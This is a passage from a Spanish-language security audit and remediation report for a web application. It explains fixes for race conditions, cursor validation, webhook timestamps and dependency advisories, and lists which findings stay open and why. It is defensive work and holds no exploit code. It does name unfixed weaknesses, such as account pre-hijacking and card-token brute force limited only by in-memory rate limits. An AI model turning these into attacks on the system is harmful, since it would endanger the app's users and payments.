que es un precio absurdo para cerrar una granja de trials que hoy nadie explotó.

**Lo que se hizo en su lugar cierra el mismo agujero sin tocar a nadie**: el mail se sigue guardando
tal como lo escribieron y el login no cambia; lo que cambia es que **el alta rechaza un mail que caiga
en la misma bandeja que una cuenta existente**. `fer+1@` … `+999@` y `f.e.r@` colisionan todos contra
`fer@` ⇒ **una cuenta por bandeja**, que era el objetivo. Sin migración y sin ventana de transición.

**La regla se escribe una sola vez** (`emailCanonico`, un fragmento SQL que se aplica igual a la
columna y al valor nuevo). Comparar una normalización de TypeScript contra otra de Postgres sería
plantar el mismo drift que `SEC-20` acaba de cerrar en otra columna. Solo `gmail.com`/`googlemail.com`:
en el resto de los dominios `+etiqueta` no es necesariamente un alias y colapsarlo rechazaría altas
legítimas.

Verificado contra los datos reales de dev — las cuatro variantes de la misma bandeja colisionan y otra
persona no:

```
true   frodriguez.este@gmail.com            false  otra.persona.distinta@gmail.com
true   frodriguezeste@gmail.com
true   frodriguez.este+1@gmail.com
true   f.rodriguez.este+999@googlemail.com
```

### `SEC-14` — el fix del informe no alcanzaba

El informe proponía *«validar que cada valor sea `string|number`»*, pero el 500 que él mismo
reprodujo era `{"s":1,"o":"abc"}`: un **string** donde va un entero, que esa validación deja pasar. El
tipo correcto depende de **qué clave** es (`d`/`s`/`o`/`b`/`c` son números; `n`/`i`, texto), así que la
clave de orden ahora declara su tipo y el cursor se valida contra él. Si una sola no cierra se
descarta el cursor entero, que es lo que el comentario del código venía prometiendo.

### `SEC-15` — el par `contar` + `incrementar` **era** el agujero

No se podía arreglar dejando las dos funciones: entre el SELECT y el upsert, N requests leen el mismo
valor bajo el tope y pasan todas. Quedó una sola `reservarUsoMensual(sku, tope)` con TX +
`onConflictDoNothing` + `FOR UPDATE`, calcada de `lib/ai/cupo.ts`.

**Consecuencia de diseño que hay que saber:** la comparación `usados >= tope` **se mudó** del
orquestador puro (`resolverEnriquecimiento`) a adentro de la transacción, que es el único lugar donde
puede ser atómica. Los tests de enrichment ahora fijan que el tope de `app_settings` **llegue tal cual
a la reserva**; que un tope en 0 apague el SKU lo sigue cubriendo `hayCuota`, que dejó de ser código
muerto y pasó a ser lo que usa la TX.

### `SEC-18` — el `ts` no siempre viene en milisegundos

MP lo manda en ms (13 dígitos) pero documenta el mismo campo en segundos en más de un lado, y elegir
mal **rechazaría todos los webhooks en silencio** — que es justo el modo de falla que el CLAUDE.md
marca como peligroso (el webhook es idempotente y fail-closed: no se ve un error, se caen
acreditaciones). Se normaliza por magnitud en vez de asumir. La ventana es de 5 minutos y tolera
desfase de reloj hacia los dos lados: el `ts` lo pone el reloj de MP, no el nuestro.

### `SEC-09` — commit aparte, y el número de `npm audit` engaña

`shadcn` pasó a `devDependencies` (**nunca se importa**: cero `import` en `app/`, `lib/`, `components/`
y `scripts/`) y `next` subió de `16.2.6` a `16.3.1`. Va en su propio commit por tocar
`package.json`/`package-lock.json`.

**El total bajó de 15 a 12, y ese número dice menos de lo que parece.** Lo que importa es qué llega
al árbol de **producción**:

- **Los 9 advisories de `next` se cerraron**: ya no aparece en el reporte.
- **`shadcn` quedó `dev:true` en el lockfile**, así que sus 7 (`undici`, `js-yaml`, `ip-address`,
  `fast-uri`, `brace-expansion`, `hono`, `@hono/node-server`) **dejaron de viajar al runtime** aunque
  `npm audit` sin flags los siga contando.
- **Lo que queda en el árbol de producción no se arregla desde acá**: la cadena
  `drizzle-kit → @esbuild-kit → esbuild` (moderate) y `nanoid` (high) entran como dependencia de
  **`better-auth`**, no por nuestra declaración. `npm ls drizzle-kit --omit=dev` lo muestra colgando
  de `better-auth@1.6.23`. Se cierra cuando better-auth actualice; no hay nada que mover.

Testigo: typecheck limpio, **837 tests** y `build` verde con Next 16.3.1 y el dev server parado.

### `SEC-17` — qué quedó afuera y por qué

Las 10 rutas con `maxDuration = 15` son las de lectura. **No se tocó** `/api/chat` (necesita sus 60)
ni el upload de fotos (sube a R2 y 15 s puede quedar corto). Tampoco `chat/conversaciones/[id]`, que
mezcla GET con un DELETE que cascadea filas. El `maxDuration` es por archivo, no por método, así que
en `votaciones/[token]` cubre también el PATCH del creador — que es un UPDATE chico.

---

## Método y cobertura

**Las 8 dimensiones del plan (ítem 8 del BACKLOG), todas cubiertas:** authz/IDOR (36 handlers) ·
inyección SQL · DoS y abuso de costos · secrets y fuga de datos · XSS/CSRF/cookies/headers · uploads
y SSRF · webhook de MercadoPago · prompt injection en el chat.

**Verificación adversarial:** 5 refutadores sobre los hallazgos que mandan el ranking. Resultado:
**0 refutados del todo, 5 corregidos** — y las correcciones fueron materiales (los US$97/hora que
eran US$108/mes; el techo del chat calculado con el número de dev, 11× de error; el vector de
mailing que era otro; la alcanzabilidad de la curaduría). Además, dos agentes **se auto-refutaron**
antes de reportar (el XSS por `href`, que React bloquea).

**Convergencias entre agentes independientes** (peso extra): `TRUSTED_IP_HEADER` lo levantaron tres
agentes distintos; el SSRF del crawler, dos; `payer_email`, dos.

**Lo que NO se hizo, y por qué:** cero tráfico contra producción · cero llamadas a Google, Anthropic
y Resend (cuestan plata real de Fer) · cero pruebas de carga (requieren una branch de staging de
Neon) · ninguna operación destructiva sobre la base. El log de sentencias que se activó en dev para
medir `SEC-01` **se revirtió**.

**Ningún fix aplicado en la sesión de auditoría.** Por pedido explícito: primero el informe completo,
después el triaje. El diff de esa sesión era este archivo. Los fixes vinieron en las dos secciones de
arriba, en dos sesiones posteriores del mismo día.

---

## Qué sigue

1. ~~Las tres verificaciones V-1/V-2/V-3~~ — **hechas**; falta solo el hostname de R2 en producción.
2. ~~Triaje con Fer~~ — **hecho**: se aplicaron los 4 fixes de una línea (§ *Fixes aplicados*).
3. ~~`SEC-05`, `SEC-06` y `SEC-07`~~ — **hechos** (§ *Fixes aplicados en la segunda sesión*).
4. ~~La cola larga barata + `SEC-13`, `SEC-18`, `SEC-21` y `SEC-09`~~ — **hechos** (§ *Fixes aplicados
   en la tercera sesión*). **De los 25, quedan 6 abiertos y ninguno es una sorpresa:**

   | ID | Por qué sigue abierto |
   |---|---|
   | `SEC-01` estructural + `SEC-11` | Los dos piden `middleware.ts` y van **juntos, en su propia sesión**. Es el trabajo más grande que queda |
   | `SEC-16` | Lo resuelve Upstash (`DEPLOY` F2). Arreglarlo aparte es escribir código para tirarlo |
   | `SEC-10` | Decisión de Fer: **medir antes de tocar** (punto 7) |
   | `SEC-20` (el SSRF) | Preventivo y **no alcanzable desde ninguna ruta HTTP**; el script corre en la máquina de Fer, no en Vercel. Se cierra solo el día que la curaduría sea un cron en Vercel. La validación duplicada que sí era un drift ya se unificó |
   | `SEC-23` | Cosmético (403 vs 404). Sin bypass |
   | `SEC-25` | Política de retención de datos, no vulnerabilidad |

   Fuera de la tabla quedan dos que no son ítems nuevos: el **pre-hijacking** de `SEC-05`, que
   `(a)`+`(b)`+`(c)` acotan pero no cierran —pide rediseñar el alta, invalidando la contraseña previa
   al verificar—, y `SEC-08`, **riesgo aceptado**.

   **Geo-bloqueo de países** (Fer lo pidió el 2026-08-18): decidido **esperar a `middleware.ts`**. No
   cierra ninguno de los 25 —un proxy residencial cuesta centavos y el escaneo automatizado sale de
   IPs de nube en EE.UU./DE/NL—, así que baja el ruido del log y no el riesgo; y sumarlo al
   `middleware.ts` de `SEC-01`/`SEC-11` son ~10 líneas contra pagar el andamio dos veces. Cuando se
   haga: en el **firewall de Vercel**, que corta antes de invocar la función; **excluyendo
   `/api/webhooks/mercadopago`**, que lo llama MP desde sus servidores y bloquearlo rompe los pagos
   **en silencio**; y **sin allowlist de Argentina sola** — el turista que averigua a dónde salir en
   Buenos Aires antes de viajar es un usuario legítimo.
5. **`DEPLOY` F2 (Upstash) queda confirmado como prioridad, no como ítem nuevo** — tal como el
   BACKLOG anticipaba. Con un matiz medido: la decisión 12 dice que *«donde más duele no es
   `/api/search` sino reclamos/altas»*. **Duele en dos lados que no estaban en esa lista**: el
   endpoint de Google (`SEC-02`, el único cupo en memoria atado a un SKU pago) y las páginas, que no
   pasan por ningún cupo (`SEC-01`, que Upstash **no** resuelve solo — hace falta `middleware.ts`).
6. **Si se enciende el cobro (F3)**: ~~hacer `SEC-18` y `SEC-19` antes~~ — **hechos**, y a propósito
   mientras el cobro estaba apagado, que era el momento más barato. Sigue en pie cerrar F2 **antes**
   que F3: el rate-limit de 5/hora del checkout es hoy el único freno al brute-force de tokens de
   tarjeta, y es memoria de proceso.
7. **`SEC-10` — decisión de Fer (2026-08-18): medir antes de tocar.** Bajar `MAX_RONDAS_TOOL` de 5 a 3
   es una línea y bajaría el peor caso del cap de ~US$96 a ~US$58/mes, pero **cuántos turnos reales
   usan 4 o 5 rondas no está medido**, y recortarlo a ciegas hace que un turno que necesitaba
   otra búsqueda conteste con menos info. El dato sale gratis del log que ya existe
   (`type: "chat_tool_call"`, una línea por llamada a la tool) — falta tráfico, no instrumentación.
   Mientras tanto el gasto lo acota `ai.chat_monthly_cap`, que **sí** está puesto.
